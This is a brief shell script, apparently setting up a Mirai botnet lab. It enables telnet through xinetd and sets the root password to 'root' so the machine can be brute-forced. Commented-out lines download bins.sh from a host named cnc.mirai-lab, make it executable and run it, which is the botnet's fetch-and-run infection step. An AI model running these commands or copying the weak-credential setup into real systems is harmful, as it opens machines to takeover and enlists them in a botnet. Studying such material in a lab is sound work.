cd /etc/xinetd.d
mv /home/bot/telnet .
echo -e "root\nroot" | passwd root # change password for telnet to common ones
service xinetd start

#wget cnc.mirai-lab/bins/bins.sh
#chmod u+x ./bins.sh
#./bins.sh
